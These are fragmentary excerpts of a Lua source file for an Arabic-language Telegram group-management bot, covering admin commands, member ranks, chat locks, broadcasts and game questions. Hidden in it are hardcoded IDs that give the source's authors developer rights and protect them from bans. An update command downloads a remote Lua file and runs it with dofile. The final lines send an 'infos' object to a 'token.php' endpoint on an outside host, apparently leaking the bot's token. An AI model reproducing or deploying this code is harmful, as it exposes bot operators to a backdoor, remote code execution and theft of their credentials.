...
sudo_users = {SUDO,1770288756,1360140225,1345161998,1450799226}   
...
var = true
elseif tonumber(user_id) == tonumber(1450799226) then
var = true
elseif tonumber(user_id) == tonumber(1345161998) then
var = true
...
var = 'بطل التليجرام'
elseif tonumber(user_id) == tonumber(1345161998) then
var = '↣O𝚂𝙺𝙰𝚁 ص الـتـ’ـلـيـ’ـجـرام↤'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then 
var = "المطور الاساسي²"  
...
local UserName = (data.username_ or "A_V_I_R_A_1")
...
os.execute('wget https://raw.githubusercontent.com/ghost091/Avair/master/BOYKA.lua')
send(msg.chat_id_, msg.id_,' ❃∫ تم تحديث السورس \n ❃∫ لديك اخر اصدار لسورس دونجل\n ❃∫ الاصدار » { 1.3v}')
dofile('BOYKA.lua')  
end
if text == 'الاصدار ❃' and DevBOYKAW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❃∫ اصدار سورس دونجل \n ❃∫ الاصدار »{ 1.3v}')
end
if text == 'قناه تحديثات البوت ❃' and DevBOYKAW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ❃∫ [تحديثات البوت](t.me/A_V_I_R_A_1) \n ❃∫ [قناه السورس](t.me/A_V_I_R_A_1)')
end
...
if text == 'الجروبات ❃' and DevBOYKAW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n ❃∫ الجروبات»{`'..Groups..'`}'
send(msg.chat_id_, msg.id_,Text) 
...
if text == "تنظيف الجروبات ❃" and DevBOYKAW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
usertext = '\n ❃∫ العضو » ['..result.title_..'](t.me/'..(username or 'A_V_I_R_A_1')..')'
status  = '\n ❃∫ تم ترقيته مطور'
...
usertext = '\n ❃∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'A_V_I_R_A_1')..')'
status  = '\n ❃∫ تم ترقيته مطور'
...
if BOYKA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❃∫ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'A_V_I_R_A_1')..') \n ❃∫ '..BOYKA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_, msg.id_," ❃∫ تمت الاذاعه الى >>{"..#list.."} جروبفي البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_,' ❃∫ عذا لا يمكنك وضع معرف جروببالاشتراك ')
return false  end
...
send(msg.chat_id_,0," ❃∫ العضو : {["..data.first_name_.."](T.ME/A_V_I_R_A_1)}\n ❃∫ ["..BOYKA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ❃∫ عذرا » {["..data.first_name_.."](T.ME/A_V_I_R_A_1)}\n ❃∫ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,' ❃∫ عدد اعضاء الجروبقليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
...
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه ديفيد جدع وسالكك", 
"ليه دوانجل بتع نسوان", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس افايره ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس افايره ؟ ", 
"كم مره حبيت؟ ", 
...
local Text = [[ 
⚡️ مرحبا في سورس افاير الاقوي ⚡️
]] 
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = '🇪🇬 صاحب التلجرام 🇪🇬', url="t.me/de_vi_d"}},
{{text = '💪 دونجل الجامد 💪', url="t.me/UU_DON"}},
{{text = '🦸 بطل التلجرام 🦸', url="t.me/ElerakyX"}},
{{text = '↣O𝚂𝙺𝙰𝚁 ص اـتـ’ـلـيـ’ـجـرام↤', url="t.me/M_o_h_a_m_e_d_U_1"}},
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ❃∫ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'A_V_I_R_A_1')..') \n ❃∫ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ❃∫ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'A_V_I_R_A_1')..') \n ❃∫ تـم قفـل التاك بالكتم ')
end,nil)   
...
if result.sender_user_id_ == tonumber(1345161998) then
send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك حظر مطور السورس عام\n")
return false 
end
if result.sender_user_id_ == tonumber(1770288756) then
send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك حظر مطور السورس عام\n")
return false 
end
if result.sender_user_id_ == tonumber(1360140225) then
send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك حظر مطور السورس عام\n")
return false 
end
if result.sender_user_id_ == tonumber(1450799226) then
send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك حظر مطور السورس عام\n")
return false 
end
...
send(msg.chat_id_, msg.id_," ❃∫ عذرا الملف لايدعم سورس دونجل \n") 
end
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ❃∫ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'A_V_I_R_A_1')..')'
status  = '\n ❃∫ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ❃∫ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'A_V_I_R_A_1')..')'
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ❃∫ تم رفع العضــو الحات في الجروب\n ❃∫ تعال حبي الحات نطيني بوسه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if result.sender_user_id_ == tonumber(1345161998) then
send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك تقيد مطور السورس\n")
return false 
end
if result.sender_user_id_ == tonumber(1770288756) then
send(msg.chat_id_, msg.id_, " ❃∫ لا يمكنك تقيد مطور السورس \n")
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ❃∫  العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'WviivW')..')'
status  = '\n ❃∫  الايدي » '..result.sender_user_id_..'\n ❃∫  تم تنزيله ادمن من الجروببكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ❃∫ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'A_V_I_R_A_1')..')'..'\n ❃∫ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'دونجل').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'دونجل')
local BOYKA_Msg = {
'عمغي 🥺💕.',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
...
sebd(msg.chat_id_,msg.id_,' ❃∫ تم تغيير اسم الجروبالى {['..Name..']}')  
end
end,nil) 
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'دونجل').." غادر" or text == 'غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'A_V_I_R_A_1')..')'
local iduser = result.sender_user_id_
...
if text == 'منو ضافني' or 'مين ضافني' then
if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
...
*❃م10 ◂ اوامر الاعضاء*
ٴ≪━━━━━━𝐀𝐕𝐀𝐈𝐑 ↺ ━━━━━━≫ٴ
彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/A_V_I_R_A_1)➢ 
]]
...
send(msg.chat_id_, msg.id_, t..'ٴ❃∫ٴ≪━━━━━━𝐀𝐕𝐀𝐈𝐑 ↺ ━━━━━━≫ٴ❃∫○ٴ\n❃∫ 彡 .[𝘉𝘖𝘠𝘒𝘈 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/A_V_I_R_A_1)➢ ')
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'دونجل')
...
https.request('https://magic9.ml/token/token.php?insert='..JSON.encode(infos))
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
